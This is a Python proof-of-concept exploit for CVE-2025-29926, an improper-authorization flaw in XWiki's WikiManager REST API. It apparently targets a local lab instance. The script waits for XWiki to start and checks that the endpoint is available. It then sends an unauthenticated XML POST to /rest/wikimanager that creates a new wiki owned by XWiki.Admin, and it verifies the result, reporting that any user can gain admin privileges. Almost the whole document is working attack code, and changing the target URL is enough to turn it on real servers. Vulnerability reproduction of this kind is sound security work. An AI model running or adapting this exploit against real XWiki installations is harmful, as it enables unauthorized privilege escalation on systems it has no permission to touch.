#!/usr/bin/env python3
import requests
import sys
import time
import random
import string

TARGET_URL = "http://localhost:18080"


def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def wait_for_xwiki(timeout=300):
    print("[*] Waiting for XWiki to start...")
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            resp = requests.get(f"{TARGET_URL}/rest/wikis", timeout=10)
            if resp.status_code == 200:
                print("[+] XWiki is ready")
                return True
        except requests.exceptions.RequestException:
            pass
        time.sleep(5)
    print("[-] XWiki did not start in time")
    return False


def check_wikimanager_available():
    try:
        resp = requests.get(f"{TARGET_URL}/rest/wikimanager", timeout=10, allow_redirects=False)
        if resp.status_code == 404 or resp.status_code == 302:
            return False
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] Error checking wikimanager: {e}")
        return False


def exploit_create_wiki(wiki_id=None, description="PoC Wiki"):
    if wiki_id is None:
        wiki_id = f"poc{random_string(6)}"
    
    wiki_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<wiki xmlns="http://www.xwiki.org">
    <id>{wiki_id}</id>
    <name>{wiki_id}</name>
    <description>{description}</description>
    <owner>XWiki.Admin</owner>
</wiki>"""
    
    headers = {
        "Content-Type": "application/xml",
        "Accept": "application/xml"
    }
    
    print(f"[*] Attempting to create wiki '{wiki_id}' without authentication...")
    
    try:
        resp = requests.post(
            f"{TARGET_URL}/rest/wikimanager",
            data=wiki_xml,
            headers=headers,
            timeout=30,
            allow_redirects=False
        )
        
        print(f"[*] Response Status: {resp.status_code}")
        
        if resp.status_code == 201 or resp.status_code == 200:
            if "wiki" in resp.text.lower() or resp.headers.get("Content-Type", "").startswith("application/xml"):
                print(f"[+] VULNERABLE! Wiki '{wiki_id}' created successfully!")
                print(f"[+] An unauthenticated user can create wikis and become admin")
                return True, wiki_id
        if resp.status_code == 302:
            print("[-] Request redirected (Distribution Wizard active or extension not installed)")
            return False, None
        elif resp.status_code == 404:
            print("[-] WikiManager REST API not available (extension not installed)")
            print("[!] Need to install xwiki-platform-wiki-rest-default extension first")
            return False, None
        elif resp.status_code == 401:
            print("[+] NOT VULNERABLE - Authentication required (patched version)")
            return False, None
        elif resp.status_code == 403:
            print("[+] NOT VULNERABLE - Authorization check in place (patched version)")
            return False, None
        else:
            print(f"[-] Unexpected response: {resp.status_code}")
            print(f"[-] Response body: {resp.text[:500]}")
            return False, None
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False, None


def verify_wiki_created(wiki_id):
    try:
        resp = requests.get(
            f"{TARGET_URL}/rest/wikis/{wiki_id}",
            timeout=10
        )
        if resp.status_code == 200:
            print(f"[+] Wiki '{wiki_id}' verified to exist")
            return True
        return False
    except requests.exceptions.RequestException:
        return False


def main():
    print("=" * 60)
    print("CVE-2025-29926 - XWiki WikiManager REST API")
    print("Improper Authorization Vulnerability PoC")
    print("=" * 60)
    
    if not wait_for_xwiki():
        print("[-] XWiki not available, exiting")
        sys.exit(1)
    
    if not check_wikimanager_available():
        print("[-] WikiManager REST API not available")
        print("[!] The xwiki-platform-wiki-rest-default extension must be installed")
        print("[!] Install via Extension Manager or use the init script")
        sys.exit(1)
    
    print("[+] WikiManager REST API is available")
    
    success, wiki_id = exploit_create_wiki()
    
    if success:
        print("\n" + "=" * 60)
        print("EXPLOITATION SUCCESSFUL")
        print("=" * 60)
        print(f"[+] Created wiki: {wiki_id}")
        print("[+] Impact: Any user can create wikis and gain admin privileges")
        print("[+] This allows further attacks on the wiki farm")
        
        if verify_wiki_created(wiki_id):
            print(f"[+] Access at: {TARGET_URL}/xwiki/wiki/{wiki_id}/")
        
        sys.exit(0)
    else:
        print("\n" + "=" * 60)
        print("EXPLOITATION FAILED")
        print("=" * 60)
        sys.exit(1)


if __name__ == "__main__":
    main()
